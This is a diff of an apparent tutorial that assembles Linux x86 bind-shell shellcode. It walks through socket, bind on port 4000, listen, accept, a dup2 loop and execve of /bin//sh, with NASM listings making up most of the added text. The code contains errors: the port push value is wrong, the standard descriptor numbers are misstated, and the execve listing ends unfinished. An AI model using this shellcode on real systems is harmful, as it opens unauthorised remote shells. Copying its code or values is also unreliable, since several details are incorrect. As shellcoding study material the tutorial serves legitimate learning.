@@ -129,10 +129,6 @@ Domain (AF_INET) is defined in: `/usr/include/x86_64-linux-gnu/bits/socket.h` as
 
 ```
 /* Protocol families.  */
-#define PF_UNSPEC       0       /* Unspecified.  */
-#define PF_LOCAL        1       /* Local to host (pipes and file-domain).  */
-#define PF_UNIX         PF_LOCAL /* POSIX name for PF_LOCAL.  */
-#define PF_FILE         PF_LOCAL /* Another non-standard name for PF_LOCAL.  */
 #define PF_INET         2       /* IP protocol family.  */
 ```
 Type (SOCK_STREAM) is defined in `/usr/include/x86_64-linux-gnu/bits/socket_type.h` as value "1"
@@ -149,9 +145,9 @@ Since moving values 1, 2 and 6 to EBX, ECX and EDX would generate null bytes as 
 nasm > mov EBX, 0x2
 00000000  BB02000000        mov ebx,0x2 
 Null bytes ---^^^^^^
-                                                                                      
+                                   
 nasm > mov ECX, 0x1
-00000000  B901000000        mov ecx,0x1                                                                       
+00000000  B901000000        mov ecx,0x1
 Null bytes ---^^^^^^
 
 nasm > mov EDX, 0x6
@@ -187,44 +183,147 @@ MOV AX, 0x167  ; 0x167 is hex syscall to socket
 MOV BL, 2      ; set domain argument
 MOV CL, 1      ; set type argument
 MOV DL, 6      ; set protocol argument
-INT 0x80       ; preforming syscall
+INT 0x80       ; interrupt
 
+MOV EDI, EAX   ; as result of socket syscall descriptor is saved in EAX
+               ; descriptor will be used with several other syscalls so
+               ; we need to save it some how for later use. One way is
+               ; to save it in EDI register which is least likely to be 
+               ; used in following syscalls
 ```
 
-.... to be continued ...
-
+Next step is to prepare registers for bind syscall. According to `man 2 bind`, bind takes 4 arguments.
 
 ```
 int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
-// When a socket is created with socket(2), it exists in a name space (address family) but has no address assigned to it.
-// bind() assigns the address specified by addr to the socket referred to by the file descriptor sockfd.  
-// addrlen specifies the size, in bytes, of the address structure pointed to by addr.
 ```
+When a socket is created with socket(2), it exists in a name space (address family) but has no address assigned to it.
+bind() assigns the address specified by addr to the socket referred to by the file descriptor sockfd.  
+addrlen specifies the size, in bytes, of the address structure pointed to by addr.
+
+In a same way as for socket syscall we need to prepare data for bind bind syscall with exception that bind is using struct sockaddr which needs to be saved on the stack. 
+In order to place some value on the stack PUSH instraction needs to be used. 
+Since stack grows from higher addresses to lower addresses, last argument needs to be pushed first and due to little endian format values needs to be pushed in reverse order. 
 
 ```
+server.sin_addr.s_addr = htonl(INADDR_ANY); // any address (0.0.0.0)
+server.sin_port = htons(4000);              // port 4000
+server.sin_family = AF_INET;                // address family (ip v4)
+```
+There is also 4th parameter: sin_zero wish is always zero. So in order to push these values onto the stack we have to use push in following order:
+
+```
+XOR  ECX, ECX    ; clear ECX so that we can push zero to the stack
+PUSH ECX         ; push zero_sin = 0 to the stack
+PUSH ECX         ; push INADDR_ANY = 0.0.0.0 to the stack
+PUSH word 0x0AF  ; push hex 0xFA0 (dec 4000) in reverse oreder due to little endian
+PUSH word 0x02   ; push hex 0x02 (dec 2) on the stack. 2 represents AF_INET
+```
+
+When struct is placed on the stack, ESP is pointing to the top of the stack, so we need to place address from ESP to ECX as address needs to be passed as 2nd argument to bind syscall.
+Once we have struct placed on the stack we can write assembly code for bind syscall.
+
+```
+MOV EBX, EAX     ; copy value from EAX to EBX, EAX holds pointer to socket descriptor as result of socket call
+MOV EAX, 0x169   ; move bind syscall number in EAX register
+MOV ECX, ESP     ; move address pointing to the top of the stack to ECX
+MOV DL, 0x16     ; move value 0x16 to EDX as third parameter
+INT 0x80         ; interrupt
+```
+
+In the same way listen syscall can be written in assembly.
+
 int listen(int sockfd, int backlog);
-// listen() marks the socket referred to by sockfd as a passive socket, that is, as a socket that will be used to accept incoming connection requests using accept(2).
-// The sockfd argument is a file descriptor that refers to a socket of type SOCK_STREAM or SOCK_SEQPACKET.
-//  The backlog argument defines the maximum length to which the queue of pending connections for sockfd may grow.  
 ```
+listen() marks the socket referred to by sockfd as a passive socket, that is, as a socket that will be used to accept incoming connection requests using accept(2).
+The sockfd argument is a file descriptor that refers to a socket of type SOCK_STREAM or SOCK_SEQPACKET.
+The backlog argument defines the maximum length to which the queue of pending connections for sockfd may grow.  
+
+From prototype code we can see backlog is set to 2: `listen(socketd, 2)` and sockfd is result of socket syscall currently located in EDI register.
 
 ```
+XOR EAX, EAX     ; set EAX to zero
+MOV EAX, 0x16B   ; move 0x16B to EAX
+MOV EBX, EDI     ; move socket descriptor into EBX as first argument
+MOV CL,  0x2     ; move "2" as backlog into ECX as second argument
+INT 0x80         ; interrupt
+```
+
+Now when we have socket, bind and listen, next we need to accept connection. From `man 2 accept` we can see which arguments need to be passed to syscall.
+
 int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
-// The accept() system call is used with connection-based socket types (SOCK_STREAM, SOCK_SEQPACKET). 
-// It extracts the first connection request on the queue of pending connections for the listening socket, sockfd, creates a new connected socket, and returns a new file descriptor referring to that socket.  
-// The newly created socket is not in the listening state.  
+```
+The accept() system call is used with connection-based socket types (SOCK_STREAM, SOCK_SEQPACKET). 
+It extracts the first connection request on the queue of pending connections for the listening socket, sockfd, creates a new connected socket, and returns a new file descriptor referring to that socket.  
+The newly created socket is not in the listening state.  
+
+```
+XOR EAX, EAX     ; set EAX to zero for clean start
+MOV EAX, 0x16C   ; move accept syscall number (0x16C) in EAX
+MOV EBX, EDI     ; move socket descriptor from EDI to EBX as first argument
+XOR ECX, ECX     ; set ECX to zero as argument is NULL
+XOR EDX, EDX     ; set EDX to zero as argument is NULL
+XOR ESI, ESI     ; set flag to 0 by XOR-ing
+INT 0x80         ; interrupt
+
+XOR EDI, EDI     ; set EDI to zero
+MOV EDI, EAX     ; As result, new socket descriptor will be saved in EAX 
+                 ; so we can move it to EDI for further use.
 ```
 
+Almost there.. next we need to call dup2 syscall with following arguments:
 ```
 int dup2(int oldfd, int newfd);
-// The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the file descriptor number specified in newfd.  If the file descriptor newfd was previously open, it is silently closed before being reused.
 ```
+The dup2() system call performs the same task as dup(), but instead of using the lowest-numbered unused file descriptor, it uses the file descriptor number specified in newfd.  If the file descriptor newfd was previously open, it is silently closed before being reused.
+
+Looking at prototype we can see that dup2() needs to be called three time, for STDIN (0), STOUT (2) and STDERR (3).
+
+```
+dup2(socketid, 0);
+dup2(socketid, 1);
+dup2(socketid, 2);
+```
+
+To reduce shell code size, instad of manually goind thru each dup2 syscall, we can create a loop. 
+ECX register will be used as counter but also as 2nd argument to dup2 syscall.
+
+```
+MOV CL, 0x3     ; putting 3 in the counter
+LOOP_DUP2:      ; loop label
+XOR EAX, EAX    ; clear EAX
+MOV AL, 0x3F    ; putting the syscall code in EAX
+MOV EBX, EDI    ; putting our new socket descriptor in EBX
+DEC CL          ; decrementing CL by one (so at first CL will be 2 then 1 and then 0)
+INT 0x80        ; interrupt
+JNZ LOOP_DUP2   ; "jump non zero" jumping back to the top of LOOP_DUP2 if the zero flag is not set
+```
+
+And finaly execve syscall.
 
 ```
 int execve(const char *pathname, char *const argv[], char *const envp[]);
-// execve()  executes the program referred to by pathname.  
-// This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initialized and uninitialized) data segments.
-// pathname must be either a binary executable, or a script starting with a line of the form:
-// #!interpreter [optional-arg]
 ```
+execve()  executes the program referred to by pathname.  
+This causes the program that is currently being run by the calling process to be replaced with a new program, 
+with newly initialized stack, heap, and (initialized and uninitialized) data segments.
+pathname must be either a binary executable, or a script starting with a line of the form: `#!interpreter [optional-arg]`.
+  
+argv is an array of argument strings passed to the new program.  By convention, the first of these strings (i.e., argv[0]) should  contain  the  filename associated  with  the file being executed.  envp is an array of strings, conventionally of the form key=value, which are passed as environment to the new program. 
+The argv and envp arrays must each include a null pointer at the end of the array.
+  
+```
+xor eax, eax
+push eax
+push 0x68732f6e
+push 0x69622f2f
 
+mov ebx, esp
+push eax
+
+mov edx, esp
+push ebx
+
+mov ecx, esp
+mov al, 0x0b
+```
